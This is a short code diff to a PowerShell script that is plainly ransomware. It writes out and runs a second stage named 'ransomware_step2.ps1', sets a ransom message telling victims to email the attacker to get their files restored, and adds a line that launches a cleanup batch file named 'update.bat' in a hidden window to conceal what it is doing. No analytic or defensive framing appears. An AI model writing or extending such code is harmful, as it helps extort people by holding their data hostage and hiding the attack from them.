@@ -123,10 +123,10 @@ foreach ($file in $filelist) {
 
 '@
 
-$stage2_name = "stage2.ps1"
+$stage2_name = ".\ransomware_step2.ps1"
 $stage2 | Out-File -FilePath $stage2_name
 
-& $ran_powershell .\stage2.ps1
+& $ran_powershell $stage2_name
 
 # Ransom message
 $message = "If you want your files restored, please contact me at [EMAIL]. I look forward to doing business with you."
@@ -141,3 +141,4 @@ del $stage2_name
 "@
 
 $cleanupfile | Out-File -FilePath "update.bat" -Encoding oem
+Start-Process -FilePath "update.bat" -WindowStyle Hidden
